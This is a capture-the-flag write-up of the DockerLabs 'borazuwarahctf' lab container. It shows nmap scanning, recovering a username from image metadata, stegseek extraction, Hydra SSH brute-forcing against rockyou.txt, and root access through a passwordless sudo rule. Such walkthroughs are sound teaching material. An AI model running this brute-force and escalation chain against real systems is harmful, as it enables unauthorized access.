# borazuwarahctf

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| borazuwarahctf | borazuwarah | Very Easy | dockerlabs |

**Summary:** This machine presents a deceptively simple attack surface that chains together three distinct techniques: web reconnaissance, steganographic analysis, and brute-force credential recovery. The web server exposes a single HTML page whose only content is a JPEG image. Inspecting that image with `exiftool` immediately reveals a planted username (`borazuwarah`) embedded in the XMP metadata fields, while the password field is conspicuously left blank — a deliberate red herring designed to prompt deeper investigation. Running `stegseek` against the same image uncovers a hidden text file concealed within the JPEG via steganography, which delivers another hint rather than the final answer. With the username in hand and no password recoverable through metadata or steganography, the attacker pivots to brute-forcing the exposed SSH service (port 22) using Hydra against the `rockyou.txt` wordlist. The trivially weak password `123456` is recovered in seconds. Upon SSH login, a `sudo -l` query reveals that the `borazuwarah` account holds unrestricted `sudo` privileges, including a passwordless `NOPASSWD` rule on `/bin/bash`. A single `sudo -i` command escalates the session to `root`, completing the full compromise from zero-knowledge reconnaissance to full system ownership in a linear, low-complexity chain.

---

## Reconnaissance

The lab environment is provisioned by deploying the Docker container using the provided automation script. The container is assigned the IP address `172.17.0.2`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/dockerlabs/borazuwarahctf]
└─$ sudo bash auto_deploy.sh borazuwarahctf.tar

                            ##        .
                      ## ## ##       ==
                   ## ## ## ##      ===
               /""""""""""""""""\___/ ===
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/
                 \    \        __/
                  \____\______/

  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]



Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

1. With the target IP confirmed, environment variables are set for convenience and a full port scan is launched with service and version detection across all 65535 ports.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/borazuwarahctf]
└─$ ip=172.17.0.2 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/borazuwarahctf]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 18:40 +07
Nmap scan report for 172.17.0.2
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.29 seconds
```

The scan reveals exactly two open ports. Port 22 is running OpenSSH 9.2p1 on a Debian base, and port 80 is serving an Apache 2.4.59 web server. The attack surface is minimal and well-defined.

---

## Web Enumeration and Image Analysis

2. A quick `curl` request to the root of the web server reveals that the entire site consists of a single, bare HTML page serving one JPEG image.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/borazuwarahctf]
└─$ curl -i $url
HTTP/1.1 200 OK
Date: Tue, 10 Mar 2026 11:43:01 GMT
Server: Apache/2.4.59 (Debian)
Last-Modified: Tue, 28 May 2024 16:23:16 GMT
ETag: "32-619860d142500"
Accept-Ranges: bytes
Content-Length: 50
Content-Type: text/html

<html><body><img src='imagen.jpeg'></body></html>
```

The HTML body is only 50 bytes in length. The entire page is a single `<img>` tag pointing to `imagen.jpeg`. This image is the obvious next target.

3. The image is downloaded locally for offline analysis.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/borazuwarahctf]
└─$ wget $url/imagen.jpeg
--2026-03-10 18:43:26--  http://172.17.0.2/imagen.jpeg
Connecting to 172.17.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18667 (18K) [image/jpeg]
Saving to: 'imagen.jpeg'

imagen.jpeg     100%[=======>]  18.23K  --.-KB/s    in 0s

2026-03-10 18:43:26 (124 MB/s) - 'imagen.jpeg' saved [18667/18667]
```

4. `file` confirms it is a valid JPEG, and `exiftool` is then run to extract all embedded metadata. The results are immediately revealing.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/borazuwarahctf]
└─$ file imagen.jpeg
imagen.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 455x455, components 3

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/borazuwarahctf]
└─$ exiftool imagen.jpeg
ExifTool Version Number         : 13.36
File Name                       : imagen.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2024:05:28 23:10:18+07:00
File Access Date/Time           : 2026:03:10 18:43:31+07:00
File Inode Change Date/Time     : 2026:03:10 18:43:26+07:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207
```

The XMP `Description` field exposes the username `borazuwarah`. The `Title` field contains a password label but its value is blank, indicating the password was intentionally omitted from the metadata to force a different discovery method.

5. Suspecting steganographic content, `stegseek` is run against the image using its default empty-passphrase and wordlist sweep. It immediately finds a hidden file with a blank passphrase.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/borazuwarahctf]
└─$ stegseek imagen.jpeg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "secreto.txt".
[i] Extracting to "imagen.jpeg.out".


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/borazuwarahctf]
└─$ cat imagen.jpeg.out
Sigue buscando, aquí no está to solución
aunque te dejo una pista....
sigue buscando en la imagen!!!
```

The concealed file (`secreto.txt`) translates loosely from Spanish as: *"Keep looking, the solution is not here — but I'll give you a hint... keep looking in the image!"* This is a deliberate misdirection. The true path forward is to use the confirmed username and brute-force the SSH password.

---

## Initial Access via SSH Brute-Force

6. With a valid username (`borazuwarah`) recovered from the EXIF metadata, Hydra is launched against the SSH service using the `rockyou.txt` wordlist to recover the password.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/borazuwarahctf]
└─$ hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-10 18:44:53
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-10 18:44:59
```

Hydra recovers the password `123456` in under six seconds. The credential pair `borazuwarah:123456` grants SSH access to the target.

7. SSH login is established using the recovered credentials.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/borazuwarahctf]
└─$ ssh borazuwarah@$ip
borazuwarah@172.17.0.2's password:
Linux 313056baabee 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64
borazuwarah@313056baabee:~$ id
uid=1000(borazuwarah) gid=1000(borazuwarah) groups=1000(borazuwarah),27(sudo)
```

The session is established as user `borazuwarah`. The `id` output shows the account belongs to group `27` (sudo), which is a strong indicator of misconfigured privilege delegation.

---

## Privilege Escalation

8. `sudo -l` is run immediately to enumerate what commands the current user may execute with elevated privileges.

```bash
borazuwarah@313056baabee:~$ sudo -l
Matching Defaults entries for borazuwarah on 313056baabee:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User borazuwarah may run the following commands on 313056baabee:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

The sudoers configuration reveals two critical entries. First, `(ALL : ALL) ALL` grants the user the ability to run any command as any user. Second, and more directly exploitable, `(ALL) NOPASSWD: /bin/bash` allows execution of `/bin/bash` as any user without providing a password at all.

9. A single command is sufficient to escalate to root.

```bash
borazuwarah@313056baabee:~$ sudo -i
root@313056baabee:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
313056baabee
```

The `sudo -i` command opens an interactive root shell. The triple confirmation via `id`, `whoami`, and `hostname` verifies that full root access has been achieved on the container `313056baabee`. The machine is completely compromised.

---

## Attack Chain Summary

1. **Reconnaissance**: A full TCP port scan with `nmap` identifies two services: OpenSSH 9.2p1 on port 22 and Apache 2.4.59 on port 80. The attack surface is constrained to these two vectors.

2. **Vulnerability Discovery**: The web server hosts a single page rendering one JPEG image. EXIF metadata analysis with `exiftool` reveals an embedded username (`borazuwarah`) in the XMP `Description` field. Steganographic analysis with `stegseek` uncovers a hidden text file inside the image, which provides a thematic hint rather than actionable credentials, confirming the password must be brute-forced.

3. **Exploitation**: Using the recovered username, Hydra performs a dictionary attack against the SSH service with the `rockyou.txt` wordlist. The weak password `123456` is cracked in under six seconds, yielding valid SSH credentials.

4. **Internal Enumeration**: Immediately upon login, `id` confirms group membership in `sudo (gid=27)` and `sudo -l` enumerates the full privilege delegation policy for the account, revealing unrestricted and passwordless access to `/bin/bash`.

5. **Privilege Escalation**: The misconfigured `NOPASSWD: /bin/bash` sudoers entry is leveraged directly via `sudo -i`, instantly escalating the session from a low-privilege user to `root` (uid=0), achieving complete system ownership with no additional tooling required.
